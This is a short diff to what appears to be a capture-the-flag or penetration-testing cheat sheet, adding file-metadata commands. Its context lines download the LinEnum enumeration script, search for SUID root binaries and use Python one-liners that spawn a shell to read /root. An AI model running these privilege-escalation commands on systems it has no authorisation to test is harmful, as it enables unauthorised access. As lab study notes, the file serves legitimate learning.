@@ -81,6 +81,11 @@ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 chmod +x FILENAME.sh
 find / -user root -perm /4000 -- remember to try next time
 
+# file metadata
+pdfinfo filename.pdf
+exiftool filename.doc
+exiftool filename.jpg
+
 # exploiting python -- https://gtfobins.github.io/gtfobins/python/
 python -c 'import os; os.system("/bin/sh -c \"ls /root\"")'
 python -c 'import os; os.system("/bin/sh -c find / -name \"root.txt\" \| grep root.txt")'
